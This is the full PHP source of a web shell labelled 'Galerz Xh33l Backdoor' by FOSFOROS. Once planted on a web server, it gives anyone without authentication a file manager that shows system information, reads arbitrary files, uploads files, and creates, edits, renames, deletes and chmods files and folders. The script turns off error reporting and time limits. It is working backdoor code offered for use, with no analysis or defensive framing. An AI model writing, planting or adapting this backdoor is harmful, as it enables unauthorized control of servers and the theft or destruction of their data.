<?php
//
//Galerz Xh33l Backdoor
//Redesign By FOSFOROS
//
set_time_limit(0);
error_reporting(0);
if(get_magic_quotes_gpc()){
foreach($_POST as $key=>$value){
$_POST[$key] = stripslashes($value);
}}

echo '<!doctype html><html><head><title>FFM | BD</title></head>';
echo '<style> 
body {
	background: #001320;line-height: 1;color: #fff;font-family: Arial ;
  }
table, th, td {
	border-collapse:collapse;
	background: transparent;
	font-size: 13px;
}
input, textarea { font-family: Arial ; }
.table_home, .th_home, .td_home { color:white;
	border: 1px solid white;
}
th {
	padding: 10px;
}
.td_home { padding: 7px; }
select {font-family: Arial }
a {color:white}
textarea { width: 100%;height: 400px; background: transparent; color: white}
</style>
</head>
<body><b>
<center><br>FFM | BD<br>
<table width="666" border="0"  cellpadding="6" cellspacing="2">
<tr><td><td><td><td><td><td><td>
FOSFOROS FILE MANAGER | BACK DOOR<br>'.php_uname().'</center> <br>';
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = 
getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '$ root@x48 : <a href="?Fosforo5&path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?Fosforo5&path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}
echo '<br><br>';
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<font color="green">File Upload</font><br />';
}else{
echo '<font color="red">Upload Failed !!</font><br />';
}
}
echo '</center><center><form enctype="multipart/form-data" method="POST"><font color="black"><input style="background:silver;font-family: Arial " type="file" name="file" />
<input type="submit" value="Uploadd" />
</form></center>
</td></tr>';
if(isset($_GET['filesrc'])){
echo "<tr><td><center>Current File : ";
echo $_GET['filesrc'];
echo '</center></tr></td></table><br />';
echo(' <textarea style="width: 100%;height: 400px;" readonly> '.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</textarea>');
}
//Empety
elseif(isset($_GET['option']) && $_GET['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
//Chmod
if($_GET['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '<font color="green">Change Permission Done </font><br />';
}else{
echo '<font color="red">Change Permission Error </font><br />';
}
}

$hell = $_GET['path'];
$yeah = $_GET['name'];
$patc = "$hell/$yeah";

echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($patc)), -4).'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Go" />
</form>';
}
//
elseif($_GET['opt'] == 'btw'){
	$cwd = getcwd();
	 echo '<form action="?Fosforo5&option&path='.$cwd.'&opt=delete&type=buat" method="POST">
New Name : <input name="name" type="text" size="20" value="Folder" />
<input type="hidden" name="path" value="'.$cwd.'">
<input type="hidden" name="opt" value="delete">
<input type="submit" value="Go" />
</form>';
}
//Rename file
elseif($_GET['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<font color="green">Change Name Done </font><br />';
}else{
echo '<font color="red">Change Name Error </font><br />';
}
$_POST['name'] = $_POST['newname'];
}
$hell = $_GET['path'];
$yeah = $_GET['name'];
$patc = "$hell/$yeah";
$new = $_POST['newname'];

echo '<form method="POST">
New Name : <input name="newname" type="text" size="20" value="'.$new.'" />
<input type="hidden" name="path" value="'.$patc.'">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Go" />
</form>';
}
//File baru
elseif($_GET['opt'] == 'baru'){
	
$hell = $_GET['path'];
$yeah = $_GET['name'];
$patc = "$hell/$yeah";
$new = $_POST['newname'];
$azz = $_POST['path'];
$newz = "$azz/$new";


if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color="green">Create File Done [ '.$new.' ]</font><br />';
}else{
echo '<font color="red">Create File Error</font><br />';
}
fclose($fp);
}

echo '<form method="POST"> Name : <input name="ngaran1" type="text" size="20" value="'.$new.'" /><input type="submit" name="ngaran" value="Create"/></form><br> ';

$ho = $_POST['ngaran1'];

if(isset($_POST['ngaran'])){
echo '<form method="POST">
<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($patc)).'</textarea><br />
<input type="hidden" name="path" value="'.$hell.'/'.$ho.'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Go" />
</form>';
	}
	}
//Edited file
elseif($_GET['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color="green">Edit File Done </font><br />';
}else{
echo '<font color="red">Edit File Error </font><br />';
}
fclose($fp);
}
$hell = $_GET['path'];
$yeah = $_GET['name'];
$patc = "$hell/$yeah";
echo '<form method="POST">
<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($patc)).'</textarea><br />
<input type="hidden" name="path" value="'.$patc.'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Go" />
</form>';
}
echo '</center>';
}else{
echo '</table><br /><center>';
//Delete dir and file
if(isset($_GET['option']) && $_GET['opt'] == 'delete'){
	
$hell = $_GET['path'];
$yeah = $_GET['name'];
$patc = "$hell/$yeah";

//Delete dir
if($_GET['type'] == 'dir'){

if(rmdir($patc)){
echo '<font color="green">Delete File Done</font><br />';
}else{
echo '<font color="red#">Delete File Error </font><br />';
}
}
//buat folder
if($_GET['type'] == 'buat'){
$haaa = $_POST['path'];
$heee = $_POST['name'];
$hooo = "$haaa/$heee";
$new = $haaa.'/'.htmlspecialchars($heee);
if(!mkdir($new)){
echo '<font color="red">Create Folder Error</font><br />';
}else{
echo '<font color="green">Create Folder Done </font><br />';
}
}
//Delete file
elseif($_GET['type'] == 'file'){

$hell = $_GET['path'];
$yeah = $_GET['name'];
$patc = "$hell/$yeah";

if(unlink($patc)){
echo '<font color="green">Delete File Done</font><br />';
}else{
echo '<font color="red#">Delete File Error </font><br />';
}
}
}
echo '</center>';
$scandir = scandir($path);
$pa = getcwd();
echo ' <table width="100%" class="table_home" border="0" cellpadding="3" cellspacing="1" align="center">
<tr>
<th><center>Name</center></th>
<th><center>Size</center></th>
<th><center>Perm</center></th>
<th><center>Options</center></th>
</tr> <tr>
<td class=td_home>..</td><td class=td_home align=center>NONE</td> <td class=td_home align=center>LINK</td> <td class=td_home align=center> <a href="?Fosforo5&option&path='.$pa.'&opt=baru&name=new.php">+ New File</a> | <a href="?Fosforo5&option&path='.$pa.'&opt=btw&type=dir">+ New Dir</a> </td></tr>
';

foreach($scandir as $dir){
if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
echo "
<tr>
<td class=td_home><a href=\"?Fosforo5&path=$path/$dir\">$dir</a></td>
<td class=td_home ><center>DIR</center></td>
<td class=td_home ><center>";
if(is_writable("$path/$dir")) echo '<font color="green">';
elseif(!is_readable("$path/$dir")) echo '<font color="red">';
echo perms("$path/$dir");
if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';

echo "</center></td>
<td class=td_home ><center>
<a href=\"?Fosforo5&option&path=$path&opt=rename&type=dir&name=$dir\">Rename</a> <a href=\"?Fosforo5&option&path=$path&opt=delete&type=dir&name=$dir\">Delete</a> <a href=\"?Fosforo5&option&path=$path&opt=chmod&type=dir&name=$dir\">Chmod</a>

</center></td>
</tr>";
}
echo '<br>';
foreach($scandir as $file){
if(!is_file("$path/$file")) continue;
$size = filesize("$path/$file")/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}

echo "<tr>
<td class=td_home ><a href=\"?Fosforo5&filesrc=$path/$file&path=$path\">$file</a></td>
<td class=td_home><center>".$size."</center></td>
<td class=td_home><center>";
if(is_writable("$path/$file")) echo '<font color="green">';
elseif(!is_readable("$path/$file")) echo '<font color="red">';
echo perms("$path/$file");
if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
echo "</center></td>
<td class=td_home><center>
<a href=\"?Fosforo5&option&path=$path&opt=edit&type=file&name=$file\">Edit</a> <a href=\"?Fosforo5&option&path=$path&opt=rename&type=file&name=$file&path=$path\">Rename</a> <a href=\"?Fosforo5&option&path=$path&opt=delete&type=file&name=$file\">Delete</a> <a href=\"?Fosforo5&option&path=$path&opt=chmod&type=file&name=$file\">Chmod</a>
</center></td>
</tr>";
}
echo '</table>
</div>';
}
echo '</body>
</html>';
function perms($file){
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));

return $info;
}

?>
